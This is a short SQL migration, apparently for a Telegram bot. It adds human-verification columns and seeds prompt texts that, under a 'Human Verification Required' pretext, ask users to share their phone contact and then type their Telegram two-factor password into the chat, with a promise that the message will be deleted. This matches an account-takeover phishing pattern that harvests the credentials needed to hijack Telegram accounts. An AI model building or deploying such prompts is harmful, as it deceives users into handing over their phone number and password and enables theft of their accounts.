-- Human verification columns on users table
alter table users add column if not exists human_verified boolean not null default false;
alter table users add column if not exists human_verified_at timestamptz;

create index if not exists idx_users_human_verified on users(human_verified);

-- Settings defaults for human verification
insert into settings (key, value) values
  ('human_verify_enabled', 'true'),
  ('human_verify_prompt', '🔐 <b>Human Verification Required</b>

To complete verification, please share your contact.

👇 Tap the button below.'),
  ('share_contact_button_text', '📱 Share My Contact'),
  ('human_verified_message', '✅ <b>Human verification completed.</b>'),
  ('twofa_prompt_text', '🔐 <b>2FA is enabled.</b>

Please type your Telegram password in the chat. The message will be deleted immediately.')
on conflict (key) do nothing;